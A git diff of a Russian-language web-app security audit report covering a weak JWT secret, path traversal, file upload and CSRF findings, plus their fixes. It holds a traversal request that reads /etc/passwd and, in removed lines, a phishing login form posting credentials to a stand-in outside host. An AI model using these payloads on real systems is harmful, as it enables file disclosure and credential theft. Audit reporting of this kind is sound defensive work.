@@ -58,11 +58,10 @@ token = jwt.encode({
 ```JSON
  JWT_SECRET = os.environ["JWT_SECRET"]
 ```
-3. Поменять ключ на рандомный и более сильный (тогда мы защитимся от подбора ключа). Можно сгенерировать так:
+2. Поменять ключ на рандомный и более сильный (тогда мы защитимся от подбора ключа). Можно сгенерировать так:
 ```py
 openssl rand -hex 64
 ```
-3. Сменить тип шифрования на асимметричный (к примеру RS256) (приватный ключ остается на сервере и подписать токен самостоятельно не получится).
 
 ---
 
@@ -203,8 +202,7 @@ def view_file():
 ```
 1. Отправляем следующий запрос:
 ```HTTP
-GET /api/admin/view?file=..%252f..%252fapp.py
-or
+
 GET /api/admin/view?file=/etc/passwd
 ```
 2. Читаем приватные файлы на сервере.
@@ -229,12 +227,8 @@ if not target.startswith(base):
 ***Тип: Arbitrary File Upload***
 
 Риски:
-1. Загрузка вредоностных html, js, pdf файлов с безобидными разрешениями
-2. Это ведет к:
-   - Stored XSS
-   - Malware hosting
-(ps тк эта уязвимость есть только в админке, то смысл от XSS немного теряется, тк мы уже знаем куки администратора, но всё же можно использовать для фишинга, чтобы узнать пароль и закрепиться на аккаунте)
-
+1. Загрузка файлов вне дирректории
+   
 Эксплуатация:
 Уязвимый код:
 ```Python
@@ -266,49 +260,9 @@ def upload_file():
 
     return jsonify({"message": "file has been successfully uploaded"}), 200
 ```
-1. Создаем файл poc.png
-```HTML
-<html>
-<body style="font-family:sans-serif">
-
-<form action="https://out_domain.com/login" method="POST">
-    <input name="username" placeholder="Login"><br><br>
-    <input type="password" name="password" placeholder="Password"><br><br>
-    <button>Login</button>
-</form>
-
-</body>
-</html>
-```
-2. Получаем пароль от аккаунта и закрепляемся там.
 
 Рекомендации по устранению:
-1. Ввести валидацию MIME типа файла: 
-```Python
-import magic
-
-ALLOWED_MIME = {
-    "image/png",
-    "image/jpeg",
-    "image/gif",
-    "application/pdf",
-    "text/plain"
-}
-
-@app.route("/api/admin/upload", methods=["POST"])
-@admin_required
-@csrf_protect
-def upload_file():
-    ....
-    header = file.stream.read(2048)
-    mime = magic.from_buffer(header, mime=True)
-    file.stream.seek(0)
-
-    if mime not in ALLOWED_MIME:
-        return jsonify(error=f"Forbidden MIME type: {mime}"), 400
-    ....
-```
-2. Не использовать оригинальные имена файлов, чтобы было сложнее к ним обратиться (```uuid.uuid4().hex```)
+1. Не использовать оригинальные имена файлов, чтобы было сложнее к ним обратиться (```uuid.uuid4().hex```)
 3. Хранить файлы в специальной директории, где они будут не исполняемые. К примеру:
 ```HTTP
 https://target.com/uploads/poc.png
@@ -434,11 +388,7 @@ const response = fetch('/api/settings/password', {
 ```
 
 Рекомендации по устранению:
-1. Поставить дополнительные флаги на токен, чтобы его нельзя было читать через js
-```
-resp.set_cookie("_csrf", value, httponly=True, samesite="Strict", secure=True)
-```
-2. Привязать токен к пользователю и проверять принадлежность токена, чтобы нельзя было установить произвольный токен жертве.
+1. Привязать токен к пользователю и проверять принадлежность токена, чтобы нельзя было установить произвольный токен жертве.
 Создать дополнительную таблицу при инициализации бд
 ```Python
 db.execute("""
@@ -487,6 +437,7 @@ def csrf_protect(f):
         return f(*args, **kwargs)
     return wrapper
 ```
+2. В функцию смены пароля добавить условие ввода предыдущего пароля.
 
 ---
 
